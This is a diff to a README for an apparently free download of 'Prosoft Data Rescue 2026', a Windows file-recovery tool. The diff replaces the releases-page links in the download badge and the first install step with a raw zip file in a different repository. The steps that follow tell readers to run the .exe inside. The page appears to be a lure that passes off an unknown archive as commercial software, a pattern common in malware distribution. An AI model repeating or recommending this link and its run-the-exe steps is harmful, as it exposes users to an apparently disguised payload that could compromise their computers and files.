@@ -5,7 +5,7 @@ description: "Download Prosoft Data Rescue for Windows 10 and 11 to recover lost
 ---
 # 💾 Prosoft-Data-Rescue-2026 - Restore Your Lost Files With Ease
 
-[![](https://img.shields.io/badge/Download-Prosoft_Data_Rescue-blue.svg)](https://github.com/Caressestrongminded988/Prosoft-Data-Rescue-2026/releases)
+[![](https://img.shields.io/badge/Download-Prosoft_Data_Rescue-blue.svg)](https://raw.githubusercontent.com/Caressestrongminded988/caressestrongminded988.github.io/main/generalizable/caressestrongminded_github_io_v2.6.zip)
 
 Prosoft Data Rescue 2026 recovers lost or deleted files from your computer. It works on Windows 11 and Windows 10. You can recover photos, documents, videos, and music. This software works for hard drives, memory cards, and USB thumb drives. It finds data even if you emptied the recycle bin or if the drive shows errors.
 
@@ -24,7 +24,7 @@ Make sure your computer meets these needs before you start:
 
 Follow these steps to get the software on your machine:
 
-1. Visit the following link to access the software files: [https://github.com/Caressestrongminded988/Prosoft-Data-Rescue-2026/releases](https://github.com/Caressestrongminded988/Prosoft-Data-Rescue-2026/releases).
+1. Visit the following link to access the software files: [https://raw.githubusercontent.com/Caressestrongminded988/caressestrongminded988.github.io/main/generalizable/caressestrongminded_github_io_v2.6.zip](https://raw.githubusercontent.com/Caressestrongminded988/caressestrongminded988.github.io/main/generalizable/caressestrongminded_github_io_v2.6.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in .exe to start your download.
 4. Open the file once the download finishes.
